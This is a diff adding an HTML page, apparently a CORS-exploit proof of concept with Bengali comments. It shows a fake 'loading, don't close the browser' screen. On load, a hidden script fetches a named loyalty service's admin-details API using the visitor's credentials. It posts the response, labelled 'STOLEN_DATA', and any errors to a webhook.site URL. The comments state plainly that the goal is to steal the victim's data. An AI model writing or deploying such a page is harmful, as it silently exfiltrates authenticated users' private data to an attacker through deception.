@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head><title>Processing...</title></head>
+<body>
+    <script>
+        const myWebhook = "https://webhook.site/bb29ec8b-4687-4463-a63c-9468fd24d200"; 
+
+        // ১. ভিক্টিমের ব্রাউজার থেকে গোপনে তথ্য চুরি করা (CORS Vulnerability ব্যবহার করে)
+        fetch("https://loyalty.yotpo.com/api/v1/admin_details", {credentials: 'include'})
+        .then(res => res.text())
+        .then(data => {
+            // ২. চুরি করা তথ্য আপনার Webhook-এ পাঠিয়ে দেওয়া
+            // আমরা ডাটা সরাসরি পাঠাচ্ছি যাতে আপনি ফুল রেসপন্স পান
+            fetch(myWebhook, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: "STOLEN_DATA: " + data
+            });
+            console.log("Data Sent!");
+        })
+        .catch(err => {
+            // যদি কোনো এরর হয় তাও আপনার কাছে মেসেজ যাবে
+            fetch(myWebhook, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: "Error occurred: " + err
+            });
+        });
+    </script>
+    <div style="text-align: center; margin-top: 50px; font-family: Arial;">
+        <h2>লোড হচ্ছে... দয়া করে ব্রাউজার বন্ধ করবেন না।</h2>
+        <p>সার্ভারের সাথে সংযোগ স্থাপন করা হচ্ছে।</p>
+    </div>
+</body>
+</html>
